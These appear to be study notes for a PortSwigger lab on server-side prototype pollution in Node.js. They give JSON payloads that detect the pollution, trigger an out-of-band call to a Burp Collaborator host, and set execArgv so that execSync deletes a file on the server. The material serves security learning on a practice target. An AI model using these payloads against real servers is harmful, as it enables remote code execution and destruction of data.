## Approach

1. Find a JSON object that is processed by the server and insert a prototype
2. If it's not reflected, test blind with **error override**, **JSON spaces override**, and **charset override**
## Labs
### [1. Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)

> [!NOTE] 
> RCE via SSPP, located in **change address** feature and execution via a maintenance job in admin panel

**Identify a PP**

> On the change address feature, we can see it's accepting JSON, we can test for PP here
```json
"__proto__": {
"foo":"bar",
}
```

**Test for code execution**

> We can see it does an admin jobs of cleaning filesystem and database, it can be assumed that it's executing a system command. It can be confirmed by the following payload as there will be an OOB interaction
```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=[BURP_COLLABORATOR]]\"\".oastify\"\".com"
}
```

**Delete file**

> Poison the prototype then execute the admin maintenance jobs
```json
"__proto__": {
    "execArgv": [
    "--eval=require('child_process').execSync('rm /home/carlos/morale.txt');"
]
}
```